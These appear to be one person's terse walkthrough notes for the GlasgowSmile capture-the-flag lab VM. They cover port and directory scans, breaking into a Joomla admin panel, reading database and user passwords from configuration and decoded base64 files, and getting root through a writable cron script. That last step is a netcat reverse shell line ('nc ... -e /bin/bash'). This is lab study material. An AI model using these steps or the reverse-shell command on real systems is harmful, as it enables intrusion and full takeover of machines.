----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# GlasgowSmile
# 2/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

----------------------------------------------------
# gobuster
----------------------------------------------------
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/joomla (Status: 301)
/server-status (Status: 403)

----------------------------------------------------
# attacking joomla
----------------------------------------------------
http://192.168.55.79/joomla/index.php/component/users/?view=login&Itemid=101
cewl -m 5 http://192.168.120.194/joomla > dict.txt

joomla:Gotham

perl joomscan.pl -u http://192.168.55.79/joomla

http://192.168.55.79/joomla/administrator/

File Upload Vulnerability

Navigate to Extensions > Templates > Templates and then choose the Protostar Details and Files template. Open and edit the file named index.php:

----------------------------------------------------
# priv esc
----------------------------------------------------
cat /var/www/joomla2/configuration.php
        public $user = 'joomla';
        public $password = 'babyjoker';
        public $db = 'joomla_db';
MariaDB [joomla_db]> use batjoke;
MariaDB [batjoke]> SELECT * FROM taskforce;
 echo -n Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ | base64 -d
 ???AllIHaveAreNegativeThoughts???        

 ssh rob@192.168.120.194

 >>cat Abnerineedyourhelp
 Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==

rob@glasgowsmile:~$ echo -n STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d
I33hope99my0death000makes44more8cents00than0my0life0


>>find / -user abner 2>/dev/null
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip

abner@glasgowsmile:~$ cd /tmp/
abner@glasgowsmile:/tmp$ cp /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip .
abner@glasgowsmile:/tmp$ unzip .dear_penguins.zip 
Archive:  .dear_penguins.zip
[.dear_penguins.zip] dear_penguins password:

Looks like this zip archive is password-protected. However, using Abner's password I33hope99my0death000makes44more8cents00than0my0life0 works here:

abner@glasgowsmile:/tmp$ cat dear_penguins 
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz


abner@glasgowsmile:/tmp$  su penguin
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz 
cd ~
penguin@glasgowsmile:~$ cd SomeoneWhoHidesBehindAMask/
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find

penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat PeopleAreStartingToNotice.txt 

 cat /etc/crontab 


penguin@glasgowsmile:/tmp$ chmod +x pspy64
penguin@glasgowsmile:/tmp$ ./pspy64
CMD: UID=0    PID=7829   | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old

penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ nano .trash_old

nc 192.168.49.55 6969 -e /bin/bash


